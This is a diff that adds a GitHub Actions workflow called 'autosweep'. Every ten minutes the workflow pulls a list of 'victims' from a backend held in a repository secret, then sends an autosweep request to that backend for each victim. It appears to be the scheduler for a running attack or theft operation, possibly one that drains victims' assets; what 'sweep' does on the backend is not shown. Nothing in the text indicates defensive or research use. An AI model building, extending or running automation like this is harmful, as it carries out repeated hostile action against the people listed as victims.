@@ -1,0 +1,18 @@
+name: autosweep
+on:
+  schedule:
+    - cron: '*/10 * * * *'
+  workflow_dispatch:
+jobs:
+  sweep:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Trigger autosweep for all known victims
+        run: |
+          BACKEND="${{ secrets.BACKEND_URL }}"
+          VICTIMS=$(curl -s "$BACKEND/api/victims" | python3 -c "import json,sys; d=json.load(sys.stdin); print(' '.join(sorted(set(x.get('victim','') for x in d if x.get('victim')))))")
+          for v in $VICTIMS; do
+            echo "sweeping $v"
+            curl -s -X POST "$BACKEND/api/autosweep/$v" | head -c 500
+            echo
+          done
